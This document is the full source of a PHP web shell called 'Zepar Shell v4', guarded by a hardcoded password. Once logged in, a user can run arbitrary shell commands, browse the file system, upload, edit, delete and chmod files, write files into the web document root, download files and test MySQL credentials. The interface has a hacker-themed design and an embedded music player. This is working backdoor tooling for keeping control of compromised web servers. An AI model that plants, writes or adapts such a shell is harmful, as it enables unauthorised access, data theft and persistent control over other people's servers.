<?php
// =============================================
// ZEPAR PHP SHELL - ENHANCED EDITION v4.0
// Author: Zepar
// Version: 1.0 - Root/Non-Root Split + Music Player
// =============================================

session_start();
$password = "villandec";

// Login handling
if (!isset($_SESSION['loggedin']) && (!isset($_POST['pass']) || $_POST['pass'] !== $password)) {
    if (isset($_POST['pass'])) {
        $error = "Invalid credentials.";
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Zepar Shell | Authentication</title>
        <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body {
                font-family: 'Courier New', monospace;
                background: url('https://files.catbox.moe/ic0kpz.jpg') no-repeat center center fixed;
                background-size: cover;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                backdrop-filter: brightness(0.4);
            }
            .login-container {
                background: rgba(0,0,0,0.82);
                backdrop-filter: blur(12px);
                border-radius: 24px;
                border: 1px solid rgba(255,80,120,0.5);
                padding: 40px 32px;
                width: 400px;
                text-align: center;
            }
            h1 { font-size: 2.4rem; color: #ff5078; margin-bottom: 8px; }
            input {
                width: 100%;
                background: rgba(20,20,30,0.9);
                border: 1px solid #ff5078;
                color: #ff90a8;
                padding: 14px 18px;
                border-radius: 40px;
                margin: 16px 0;
            }
            button {
                width: 100%;
                background: #ff2040;
                border: none;
                padding: 12px;
                border-radius: 40px;
                font-weight: bold;
                cursor: pointer;
            }
            .error { background: #ff000030; color: #ff8888; padding: 10px; border-radius: 30px; margin-top: 16px; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h1>ZEPAR</h1>
            <form method="post">
                <input type="password" name="pass" placeholder="enter access key" autofocus>
                <button type="submit">ACCESS SHELL</button>
                <?php if (isset($error)) echo '<div class="error">' . $error . '</div>'; ?>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

$_SESSION['loggedin'] = true;

// ========== CORE FUNCTIONS ==========
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if (!is_dir($current_dir)) $current_dir = getcwd();
chdir($current_dir);

// Root mode atau non-root
$root_mode = isset($_GET['root_mode']) ? $_GET['root_mode'] : 'nonroot';
$doc_root = $_SERVER['DOCUMENT_ROOT'] ?? $_SERVER['SCRIPT_FILENAME'] ?? getcwd();
$doc_root = rtrim($doc_root, '/\\');

if ($root_mode == 'root') {
    $active_dir = isset($_GET['root_dir']) ? $_GET['root_dir'] : $doc_root;
    if (!is_dir($active_dir)) $active_dir = $doc_root;
    chdir($active_dir);
} else {
    $active_dir = $current_dir;
}

function get_file_list($dir) {
    $files = scandir($dir);
    $list = [];
    foreach ($files as $f) {
        if ($f != '.' && $f != '..') {
            $p = $dir . DIRECTORY_SEPARATOR . $f;
            $list[] = [
                'name' => $f,
                'path' => $p,
                'is_dir' => is_dir($p),
                'size' => is_file($p) ? filesize($p) : 0,
                'perms' => substr(sprintf('%o', fileperms($p)), -4),
                'mtime' => date('Y-m-d H:i:s', filemtime($p))
            ];
        }
    }
    return $list;
}

function exec_cmd($cmd) {
    $out = [];
    if (function_exists('exec')) { exec($cmd . ' 2>&1', $out); }
    elseif (function_exists('shell_exec')) { $out = explode("\n", shell_exec($cmd . ' 2>&1')); }
    elseif (function_exists('system')) { ob_start(); system($cmd . ' 2>&1'); $out = explode("\n", ob_get_clean()); }
    else { $out = ['[!] exec disabled']; }
    return $out;
}

$msg = '';
// Upload file
if (isset($_FILES['upload'])) {
    $target = $active_dir . '/' . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) $msg = "Uploaded: " . basename($target);
    else $msg = "Upload failed";
}
// Delete file
if (isset($_POST['del_file']) && unlink($_POST['del_file'])) $msg = "Deleted: " . basename($_POST['del_file']);
// Delete directory
if (isset($_POST['del_dir']) && rmdir($_POST['del_dir'])) $msg = "Removed dir: " . basename($_POST['del_dir']);
// Create directory
if (isset($_POST['mkdir']) && mkdir($active_dir . '/' . $_POST['dir_name'])) $msg = "Created dir: " . $_POST['dir_name'];
// Create file
if (isset($_POST['touch']) && file_put_contents($active_dir . '/' . $_POST['file_name'], $_POST['file_content'])) $msg = "Created file: " . $_POST['file_name'];
// Save edit file
if (isset($_POST['save_edit']) && file_put_contents($_POST['edit_path'], $_POST['edit_data'])) $msg = "Saved: " . basename($_POST['edit_path']);
// Copy file/dir
if (isset($_POST['copy_path']) && isset($_POST['copy_dest'])) {
    if (is_dir($_POST['copy_path'])) {
        function recurse_copy($src, $dst) {
            $dir = opendir($src);
            @mkdir($dst);
            while(false !== ($file = readdir($dir))) {
                if (($file != '.') && ($file != '..')) {
                    if (is_dir($src . '/' . $file)) recurse_copy($src . '/' . $file, $dst . '/' . $file);
                    else copy($src . '/' . $file, $dst . '/' . $file);
                }
            }
            closedir($dir);
        }
        recurse_copy($_POST['copy_path'], $_POST['copy_dest']);
        $msg = "Copied directory: " . basename($_POST['copy_path']);
    } else {
        if (copy($_POST['copy_path'], $_POST['copy_dest'])) $msg = "Copied: " . basename($_POST['copy_path']);
        else $msg = "Copy failed";
    }
}
// Move/Rename
if (isset($_POST['move_path']) && isset($_POST['move_dest'])) {
    if (rename($_POST['move_path'], $_POST['move_dest'])) $msg = "Moved: " . basename($_POST['move_path']);
    else $msg = "Move failed";
}
// Chmod
if (isset($_POST['chmod_path']) && isset($_POST['chmod_perms'])) {
    $perms = octdec($_POST['chmod_perms']);
    if (chmod($_POST['chmod_path'], $perms)) $msg = "Chmod success: " . $_POST['chmod_perms'];
    else $msg = "Chmod failed";
}
// Root document operations
if (isset($_POST['root_edit_path']) && isset($_POST['root_edit_data'])) {
    if (file_put_contents($_POST['root_edit_path'], $_POST['root_edit_data'])) $msg = "Root file saved: " . basename($_POST['root_edit_path']);
    else $msg = "Failed to save root file";
}
if (isset($_POST['root_new_file']) && isset($_POST['root_new_filename'])) {
    $root_target = $doc_root . '/' . $_POST['root_new_filename'];
    if (file_put_contents($root_target, $_POST['root_new_content'])) $msg = "Created root file: " . $_POST['root_new_filename'];
    else $msg = "Failed to create root file";
}
if (isset($_POST['root_delete_file'])) {
    if (unlink($_POST['root_delete_file'])) $msg = "Deleted root file: " . basename($_POST['root_delete_file']);
    else $msg = "Failed to delete root file";
}
// Find files
$search_result = [];
if (isset($_POST['find_pattern'])) {
    $pattern = $_POST['find_pattern'];
    $dir_to_search = isset($_POST['find_dir']) ? $_POST['find_dir'] : $active_dir;
    if (is_dir($dir_to_search)) {
        $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir_to_search));
        foreach ($rii as $file) {
            if (!$file->isDir() && strpos($file->getFilename(), $pattern) !== false) {
                $search_result[] = $file->getPathname();
            }
            if (count($search_result) > 100) break;
        }
        $msg = "Found " . count($search_result) . " files matching '$pattern'";
    }
}
// Database connect test
$db_result = '';
if (isset($_POST['db_host']) && isset($_POST['db_user'])) {
    try {
        $mysqli = @new mysqli($_POST['db_host'], $_POST['db_user'], $_POST['db_pass'], $_POST['db_name']);
        if (!$mysqli->connect_error) {
            $db_result = "Connected to MySQL successfully. Server info: " . $mysqli->server_info;
            $mysqli->close();
        } else {
            $db_result = "Connection failed: " . $mysqli->connect_error;
        }
    } catch (Exception $e) {
        $db_result = "Error: " . $e->getMessage();
    }
}
// Command execution
$cmd_result = '';
if (isset($_POST['terminal_cmd'])) $cmd_result = exec_cmd($_POST['terminal_cmd']);

$files = get_file_list($active_dir);
$root_files = is_dir($doc_root) ? scandir($doc_root) : [];
$current_song = isset($_COOKIE['zepar_song']) ? $_COOKIE['zepar_song'] : 'lost_soul';
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zepar Shell v4 - Split Access</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: url('https://files.catbox.moe/p274tb.jpg') fixed center/cover no-repeat;
            font-family: 'Courier New', monospace;
            padding: 20px;
            color: #f0f0f0;
        }
        .overlay {
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(4px);
            min-height: 100vh;
            border-radius: 28px;
            padding: 24px;
        }
        .main-layout {
            display: flex;
            gap: 20px;
        }
        .sidebar {
            width: 280px;
            flex-shrink: 0;
        }
        .content {
            flex: 1;
        }
        .header {
            text-align: center;
            border-bottom: 2px solid #ff3366;
            margin-bottom: 28px;
            padding-bottom: 12px;
        }
        .header h1 { font-size: 2.8rem; color: #ff3366; text-shadow: 0 0 8px #ff1144; }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
            gap: 20px;
        }
        .card {
            background: rgba(10,10,15,0.85);
            backdrop-filter: blur(8px);
            border-radius: 24px;
            border: 1px solid #ff3366;
            padding: 20px;
        }
        .card h2 {
            color: #ff5577;
            border-left: 5px solid #ff3366;
            padding-left: 12px;
            margin-bottom: 16px;
            font-size: 1.2rem;
        }
        .sidebar-card {
            background: rgba(10,10,15,0.9);
            backdrop-filter: blur(8px);
            border-radius: 24px;
            border: 1px solid #ff3366;
            padding: 20px;
            margin-bottom: 20px;
        }
        .sidebar-card h3 {
            color: #ff7799;
            border-bottom: 1px solid #ff3366;
            padding-bottom: 8px;
            margin-bottom: 16px;
        }
        .terminal-box {
            background: #0a0c0a;
            border-radius: 16px;
            padding: 12px;
            font-size: 0.75rem;
            max-height: 250px;
            overflow: auto;
            font-family: monospace;
        }
        input, textarea, select, button {
            background: #111;
            border: 1px solid #ff3366;
            color: #ffccdd;
            padding: 8px 12px;
            border-radius: 30px;
            font-family: monospace;
            margin: 6px 4px;
        }
        button {
            background: #ff3366;
            color: black;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background: #ff6688;
            box-shadow: 0 0 8px #ff3366;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.7rem;
        }
        th, td {
            text-align: left;
            padding: 6px 3px;
            border-bottom: 0.5px solid #ff557755;
        }
        .breadcrumb a { color: #ff88aa; text-decoration: none; }
        .status {
            background: #1a2020;
            border-radius: 20px;
            padding: 8px 16px;
            margin-bottom: 20px;
            text-align: center;
        }
        .file-act a, .file-act button {
            background: none;
            border: none;
            color: #ff88aa;
            cursor: pointer;
            font-size: 0.65rem;
            margin: 0 2px;
        }
        .footer {
            text-align: center;
            margin-top: 32px;
            opacity: 0.6;
            font-size: 0.7rem;
        }
        hr { border-color: #ff3366; margin: 12px 0; }
        @media (max-width: 900px) { .main-layout { flex-direction: column; } .sidebar { width: 100%; } }
        a { color: #ff88aa; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .root-badge { color: #ff88ff; }
        .nonroot-badge { color: #88ff88; }
        .mode-switch {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
        }
        .mode-btn {
            flex: 1;
            text-align: center;
            padding: 10px;
            border-radius: 40px;
            background: #1a1a2a;
            cursor: pointer;
            font-weight: bold;
        }
        .mode-btn.active {
            background: #ff3366;
            color: black;
        }
        .mode-btn a {
            color: inherit;
            text-decoration: none;
        }
        .song-btn {
            display: block;
            width: 100%;
            text-align: left;
            background: #1a1a2a;
            margin: 8px 0;
            padding: 10px;
            border-radius: 20px;
        }
        .song-btn.active-song {
            background: #ff3366;
            color: black;
        }
        audio {
            width: 100%;
            margin-top: 12px;
        }
    </style>
</head>
<body>
<div class="overlay">
    <div class="header">
        <h1>ZEPAR SHELL v4</h1>
        <div class="badge">:: split access root/non-root :: audio ambient ::</div>
    </div>

    <div class="main-layout">
        <!-- SIDEBAR KIRI -->
        <div class="sidebar">
            <!-- Mode Switch -->
            <div class="sidebar-card">
                <h3>ACCESS MODE</h3>
                <div class="mode-switch">
                    <div class="mode-btn <?= $root_mode == 'nonroot' ? 'active' : '' ?>">
                        <a href="?root_mode=nonroot">📁 NON-ROOT</a>
                    </div>
                    <div class="mode-btn <?= $root_mode == 'root' ? 'active' : '' ?>">
                        <a href="?root_mode=root">👑 ROOT</a>
                    </div>
                </div>
                <div style="font-size:0.7rem; text-align:center; margin-top:8px;">
                    <?php if($root_mode == 'root'): ?>
                    <span class="root-badge">Current: ROOT Access (Document Root)</span>
                    <?php else: ?>
                    <span class="nonroot-badge">Current: NON-ROOT (Working Dir)</span>
                    <?php endif; ?>
                </div>
            </div>

            <!-- Music Player -->
            <div class="sidebar-card">
                <h3>🎵 AMBIENT THEME</h3>
                <form method="post" action="">
                    <button type="submit" name="set_song" value="lost_soul" class="song-btn <?= $current_song == 'lost_soul' ? 'active-song' : '' ?>">
                        🎧 Lost Soul (Default)
                    </button>
                    <button type="submit" name="set_song" value="obsessed" class="song-btn <?= $current_song == 'obsessed' ? 'active-song' : '' ?>">
                        🎧 Obsessed
                    </button>
                    <button type="submit" name="set_song" value="hotel_room" class="song-btn <?= $current_song == 'hotel_room' ? 'active-song' : '' ?>">
                        🎧 Hotel Room
                    </button>
                </form>
                <?php
                if (isset($_POST['set_song'])) {
                    $song_val = $_POST['set_song'];
                    setcookie('zepar_song', $song_val, time() + 86400 * 30, '/');
                    $current_song = $song_val;
                    echo "<script>location.reload();</script>";
                }
                $song_urls = [
                    'lost_soul' => 'https://files.catbox.moe/wa4fzv.m4a',
                    'obsessed' => 'https://files.catbox.moe/dhbxbs.mp3',
                    'hotel_room' => 'https://files.catbox.moe/2a46o4.mp3'
                ];
                $current_url = $song_urls[$current_song] ?? $song_urls['lost_soul'];
                ?>
                <audio controls autoplay loop>
                    <source src="<?= $current_url ?>" type="audio/mpeg">
                    Your browser does not support audio.
                </audio>
                <div style="font-size:0.65rem; text-align:center; margin-top:8px;">Now playing: <?= ucfirst(str_replace('_', ' ', $current_song)) ?></div>
            </div>

            <!-- Quick Info -->
            <div class="sidebar-card">
                <h3>⚡ QUICK INFO</h3>
                <div style="font-size:0.7rem;">
                    PHP: <?= phpversion() ?><br>
                    User: <?= function_exists('exec') ? exec('whoami') : 'n/a' ?><br>
                    OS: <?= PHP_OS ?><br>
                    <?php if($root_mode == 'root'): ?>
                    Root: <?= htmlspecialchars($doc_root) ?>
                    <?php else: ?>
                    Dir: <?= htmlspecialchars(substr($active_dir, 0, 40)) ?>...
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <!-- MAIN CONTENT -->
        <div class="content">
            <!-- Status Bar -->
            <div class="status">
                <?php if($root_mode == 'root'): ?>
                👑 ROOT MODE ACTIVE 👑 | Path: <?= htmlspecialchars($active_dir) ?>
                | <a href="?root_mode=root&root_dir=<?= urlencode(dirname($active_dir)) ?>">⬆ Parent</a>
                <?php else: ?>
                📁 NON-ROOT MODE | Path: <?= htmlspecialchars($active_dir) ?>
                | <a href="?root_mode=nonroot&dir=<?= urlencode(dirname($active_dir)) ?>">⬆ Parent</a>
                <?php endif; ?>
                <?php if($msg): ?> | <?= htmlspecialchars($msg) ?><?php endif; ?>
            </div>

            <div class="grid">
                <!-- FILE EXPLORER -->
                <div class="card">
                    <h2>📁 FILE EXPLORER (<?= $root_mode == 'root' ? 'ROOT' : 'NON-ROOT' ?>)</h2>
                    <div style="overflow-x:auto; max-height:300px; overflow-y:auto;">
                        <table>
                            <thead><tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr></thead>
                            <tbody>
                                <?php foreach($files as $f): ?>
                                <tr>
                                    <td><?= $f['is_dir'] ? "📂 " : "📄 " ?>
                                        <?php if($root_mode == 'root'): ?>
                                        <a href="?root_mode=root&root_dir=<?= urlencode($f['path']) ?>"><?= htmlspecialchars($f['name']) ?></a>
                                        <?php else: ?>
                                        <a href="?root_mode=nonroot&dir=<?= urlencode($f['path']) ?>"><?= htmlspecialchars($f['name']) ?></a>
                                        <?php endif; ?>
                                    </td>
                                    <td><?= $f['is_dir'] ? '--' : number_format($f['size']).'B' ?></td>
                                    <td><?= $f['perms'] ?></td>
                                    <td class="file-act">
                                        <?php if(!$f['is_dir']): ?>
                                            <form method="post" style="display:inline;" onsubmit="return confirm('Delete?')">
                                                <input type="hidden" name="del_file" value="<?= htmlspecialchars($f['path']) ?>">
                                                <button type="submit">Del</button>
                                            </form>
                                            <button onclick="editFile('<?= htmlspecialchars($f['path']) ?>', '<?= $root_mode ?>')">Edit</button>
                                            <a href="?download=<?= urlencode($f['path']) ?>&root_mode=<?= $root_mode ?>">Dl</a>
                                        <?php else: ?>
                                            <form method="post" style="display:inline;" onsubmit="return confirm('Remove EMPTY dir')">
                                                <input type="hidden" name="del_dir" value="<?= htmlspecialchars($f['path']) ?>">
                                                <button type="submit">Del</button>
                                            </form>
                                        <?php endif; ?>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                    <hr>
                    <form method="post" style="display:inline-block;">
                        <input type="text" name="copy_path" placeholder="Source" size="15">
                        <input type="text" name="copy_dest" placeholder="Dest" size="15">
                        <button type="submit">Copy</button>
                    </form>
                    <form method="post" style="display:inline-block;">
                        <input type="text" name="move_path" placeholder="Source" size="15">
                        <input type="text" name="move_dest" placeholder="New" size="15">
                        <button type="submit">Move</button>
                    </form>
                    <form method="post" style="display:inline-block;">
                        <input type="text" name="chmod_path" placeholder="Path" size="15">
                        <input type="text" name="chmod_perms" placeholder="755" size="4">
                        <button type="submit">Chmod</button>
                    </form>
                </div>

                <!-- TERMINAL -->
                <div class="card">
                    <h2>💀 TERMINAL</h2>
                    <form method="post">
                        <input type="text" name="terminal_cmd" placeholder="command (id, whoami, ls)" style="width:70%">
                        <button type="submit">Execute</button>
                    </form>
                    <div class="terminal-box">
                        <pre><?php if($cmd_result) foreach($cmd_result as $line) echo htmlspecialchars($line)."\n"; else echo "# waiting for command...\n"; ?></pre>
                    </div>
                </div>

                <!-- UPLOAD + CREATE -->
                <div class="card">
                    <h2>📤 UPLOAD & CREATE</h2>
                    <form method="post" enctype="multipart/form-data">
                        <input type="file" name="upload" required>
                        <button type="submit">Upload</button>
                    </form>
                    <hr>
                    <form method="post">
                        <input type="text" name="dir_name" placeholder="new directory" required>
                        <button type="submit" name="mkdir">Create Dir</button>
                    </form>
                    <hr>
                    <form method="post">
                        <input type="text" name="file_name" placeholder="filename.php">
                        <textarea name="file_content" rows="2" placeholder="content..."></textarea>
                        <button type="submit" name="touch">Create File</button>
                    </form>
                </div>

                <!-- SEARCH + DB -->
                <div class="card">
                    <h2>🔍 SEARCH & MySQL</h2>
                    <form method="post">
                        <input type="text" name="find_pattern" placeholder="filename pattern" size="20" required>
                        <input type="text" name="find_dir" placeholder="directory" value="<?= htmlspecialchars($active_dir) ?>" size="20">
                        <button type="submit">Search</button>
                    </form>
                    <?php if($search_result): ?>
                    <div class="terminal-box" style="max-height:120px;">
                        <?php foreach($search_result as $sf): echo htmlspecialchars($sf) . "\n"; endforeach; ?>
                    </div>
                    <?php endif; ?>
                    <hr>
                    <form method="post">
                        <input type="text" name="db_host" placeholder="Host" value="localhost" size="10">
                        <input type="text" name="db_user" placeholder="User" size="10">
                        <input type="password" name="db_pass" placeholder="Pass" size="10">
                        <input type="text" name="db_name" placeholder="DB" size="10">
                        <button type="submit">Test MySQL</button>
                    </form>
                    <?php if($db_result): ?>
                    <div class="terminal-box"><?= htmlspecialchars($db_result) ?></div>
                    <?php endif; ?>
                </div>
            </div>

            <!-- ROOT SPECIFIC SECTION (hanya tampil di root mode) -->
            <?php if($root_mode == 'root'): ?>
            <div class="card" style="margin-top:20px;">
                <h2>👑 ROOT DOCUMENT MANAGEMENT</h2>
                <div style="max-height:200px; overflow:auto;">
                    <?php 
                    $count = 0;
                    foreach($root_files as $rf):
                        if($rf != '.' && $rf != '..' && $count++ < 40):
                            $full_root_path = $doc_root . '/' . $rf;
                            echo "<div style='display:inline-block; margin:5px; background:#1a1a2a; padding:5px 10px; border-radius:15px;'>";
                            echo "<span>📄 " . htmlspecialchars($rf) . "</span> ";
                            if(is_file($full_root_path)):
                                echo "<button onclick=\"editRootFile('" . htmlspecialchars($full_root_path) . "')\" style='font-size:0.6rem; padding:2px 8px;'>Edit</button>";
                                echo "<form method='post' style='display:inline;' onsubmit=\"return confirm('Delete root file?')\"><input type='hidden' name='root_delete_file' value='" . htmlspecialchars($full_root_path) . "'><button type='submit' style='font-size:0.6rem; padding:2px 8px;'>Del</button></form>";
                            endif;
                            echo "</div>";
                        endif;
                    endforeach;
                    ?>
                </div>
                <hr>
                <form method="post">
                    <input type="text" name="root_new_filename" placeholder="newfile.php" required>
                    <textarea name="root_new_content" rows="2" placeholder="Content..."></textarea>
                    <button type="submit" name="root_new_file">Create in Root</button>
                </form>
            </div>
            <?php endif; ?>

            <div class="footer">
                Zepar PHP Shell v4 | Split Root/Non-Root Access | Ambient Player | Authorized Use Only
            </div>
        </div>
    </div>
</div>

<script>
function editFile(path, mode) {
    let newContent = prompt("Edit file content (will overwrite):\n" + path, "");
    if (newContent !== null) {
        let form = document.createElement('form');
        form.method = 'post';
        form.innerHTML = `<input type="hidden" name="save_edit" value="1">
                          <input type="hidden" name="edit_path" value="${path.replace(/&/g, '&amp;').replace(/</g, '&lt;')}">
                          <textarea name="edit_data">${newContent.replace(/&/g, '&amp;').replace(/</g, '&lt;')}</textarea>`;
        document.body.appendChild(form);
        form.submit();
    }
}
function editRootFile(path) {
    let newContent = prompt("Edit ROOT file content (will overwrite):\n" + path, "");
    if (newContent !== null) {
        let form = document.createElement('form');
        form.method = 'post';
        form.innerHTML = `<input type="hidden" name="root_edit_path" value="${path.replace(/&/g, '&amp;').replace(/</g, '&lt;')}">
                          <textarea name="root_edit_data">${newContent.replace(/&/g, '&amp;').replace(/</g, '&lt;')}</textarea>`;
        document.body.appendChild(form);
        form.submit();
    }
}
<?php if(isset($_GET['download'])): $dl = $_GET['download']; if(file_exists($dl) && is_file($dl)): header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="'.basename($dl).'"'); readfile($dl); exit; endif; endif; ?>
</script>
</body>
</html>